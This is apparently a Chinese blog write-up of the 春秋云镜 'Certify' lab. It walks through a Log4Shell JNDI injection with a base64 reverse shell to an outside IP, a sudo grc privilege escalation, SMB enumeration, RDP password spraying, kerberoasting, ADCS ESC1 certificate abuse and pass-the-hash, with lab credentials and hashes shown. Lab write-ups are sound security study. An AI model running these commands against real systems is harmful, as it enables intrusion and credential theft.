---
title: "春秋云镜 Certify"
onlyTitle: true
date: 2025-10-18 23:07:32
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8175.png
---



## 春秋云镜 Certify

### flag1

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017194455235.png)

存在log4j2

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017194633597.png)

且为jdk1.8u101，低版本直接注

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017203227726.png)



打CVE-2021-44228

https://blog.csdn.net/qq_55202378/article/details/139736712

随便找个在Log4j日志中会记录的点进行注入都可以

```sh
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzIuNzQuMTk3LzE5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 117.72.74.197
```

>bash -i >& /dev/tcp/117.72.74.197/1999 0>&1

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017203459069.png)

http://39.98.117.34:8983/solr/admin/cores?action=${jndi:ldap://117.72.74.197:1389/4qvbv2}

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017203545003.png)

sudo -l查看能以sudo运行的特权命令，看到一个NOPASSWD的东西，grc

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017203622403.png)

GTFOBins找到grc的提权方式

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017203753131.png)

sudo grc --pty /bin/sh

提到root权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017203818565.png)

转交互式shell

python3 -c 'import pty; pty.spawn("/bin/bash")'

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017203943145.png)

flag01: flag{d1e4e61d-4803-49b1-983b-f0749d468733}

### flag2

看到是linux系统

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017204033336.png)

网段位于172.22.9.19/24

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017204048350.png)

从自己vps下一个fscan扫描内网

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017205048741.png)

```
172.22.9.26 winServer 2016
172.22.9.7 DC域控 IIS Server
172.22.9.47 fileserver
172.22.9.19 本机
```

不过这里没扫出有13主机？

先写个ssh压压惊

先内网代理出来

```sh
./gost -L socks5://:5555?bind=true
./gost -L rtcp://:2222/39.98.117.34:22 -F socks5://172.22.13.28:5555

```

47为fileserver，推测存在smb服务，nmap扫一下445端口

```
proxychains4 nmap -sT -p445 172.22.9.47
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017211809201.png)

先列出目标机器上的共享资源

```sh
proxychains smbclient -L //172.22.9.47
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017212107612.png)

看到有个bill share

smbclient链接

```
proxychains smbclient //172.22.9.47/fileshare
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017212229821.png)

列目录看到有以下文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017212243481.png)

secret文件夹下有flag02.txt

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017212400303.png)

flag02: flag{8a3acdf1-67a2-445f-91a7-af57ad3f2a73}

这里还提示了：

Yes, you have enumerated smb. But do you know what an SPN is?

### flag3

把personal.db下下来，有三个表

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017212730420.png)

可以用hydra去做密码喷洒，用户为上面的这个表，密码为下面的4个中的一个

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017213049961.png)

copy出来用crackmapexec对整个网段做喷洒，服务为rdp

```sh
proxychains crackmapexec rdp 172.22.9.1/24 -u user.txt -p pass.txt --continue-on-success 2>/dev/null
```

得到172.22.9.26的两个用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017215514553.png)

```
xiaorang.lab\zhangjian:i9XDE02pLVf
xiaorang.lab\liupeng:fiAzGwEMgTY 
```

直接打域控的kerberoasting攻击

```
proxychains impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
```

获取到了两个用户的SPN

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017213920320.png)

获取到SPN票据

使用hashcat进行破解

```text
cp /usr/share/wordlists/rockyou.txt.gz /home/kali/Desktop
gzip -d rockyou.txt.gz
hashcat 1.txt rockyou.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017214959546.png)

zhangxia    MyPass2@@6

这里rdestop显示版本有问题，可能是机器太老了，rdp版本不行

xfreerdp和rdestop有啥区别

```
proxychains xfreerdp /u:"zhangxia@xiaorang.lab" /v:172.22.9.26:3389
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017215850410.png)

链上来，权限有些低

找到一个有漏洞的证书模板XR Manager

```sh
Certify.exe find /vulnerable
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017220305798.png)

这里满足：

- **msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT**
   表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户
- **PkiExtendedKeyUsage: Client Authentication**
   表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证
- **Enrollment Rights: NT Authority\Authenticated Users**
   表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书

可以打ESC1

我看到有工具可以自动识别证书属于哪种类型漏洞，我找找哦

```sh
proxychains4 certipy-ad find -u 'zhangxia@xiaorang.lab'  -password 'MyPass2@@6' -dc-ip 172.22.9.7 -vulnerable -stdout
```

certipy-ad find就可以

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251019172907671.png)



修改/etc/hosts

```
172.22.9.7 xiaorang.lab
```

```sh
proxychains certipy-ad req -u 'zhangxia@xiaorang.lab' -p 'MyPass2@@6' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca 'xiaorang-XIAORANG-DC-CA' -template 'XR Manager' -upn 'administrator@xiaorang.lab'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017221003932.png)

administrator的模拟证书保存到了administrator.pfx

继续获取管理员hash

```sh
proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017221151323.png)

Got hash for 'administrator@xiaorang.lab': aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80

```
proxychains impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26 -codec gbk
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017221324859.png)

type C:\Users\Administrator\flag\flag03.txt

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017222431101.png)

flag03: flag{74f4b89b-5170-4a31-bf14-3e2f9c6232df}



### flag4

```
proxychains impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7 -codec gbk
type C:\Users\Administrator\flag\flag04.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251017222534976.png)

flag04: flag{4981db43-8bf8-47de-a5fd-695aec6d1fdb}





### 问题

#### xfreerdp和rdestop有啥区别

rdesktop主要支持 RDP 4.0-7.0，已停止维护

xfreerdp支持最新的 RDP 7.0-10.0 协议

#### kerberoasting攻击

proxychains impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf

自动发现域中所有配置了SPN的服务账户

```
攻击获得的数据：
- 服务账户用户名（如：sql_svc、web_svc）
- 加密的服务票据（使用服务账户密码哈希加密）
- SPN服务类型和主机信息
```

在Active  Directory域环境中，Kerberos协议允许任何经过认证的域用户请求任何服务（SPN）的服务票据（TGS）。这些服务票据是使用服务账户的密码哈希加密的。因此，即使是一个普通的域用户（如zhangjian），也可以请求域内所有注册了SPN的服务账户的票据。

`Kerberos` 使用所请求服务的 `NTLM` 哈希来加密给定服务主体名称 (SPN) 的 `KRB_TGS` 票证。当域用户向域控制器 `KDC` 发送针对已注册 `SPN` 的任何服务的 `TGS 票证`请求时，`KDC` 会生成 `KRB_TGS`
 攻击者可以离线使用例如`hashcat`来暴力破解服务帐户的密码

获取到的服务票据有可能不是初始请求用户的，这样就能扩大权限范围

这一切本来是没什么问题的，因为TGS票据在密码够强壮的情况下是破解不出来的，也就没什么用。问题在于部分用户的密码不够强壮



#### ADCS攻击

https://abrictosecurity.com/pentesting-active-directory-certificate-services-adcs-esc1-esc8/









为什么26rdp的zhangjian账密要去域控7使用

根据kerberoasting攻击，用域用户去域控上请求SPN得到TGS

为什么这里从域控7主机打下zhangxia的SPN要去26使用？

因为根据上面的kerberoasting攻击，获取到的TGS不一定是域控上的







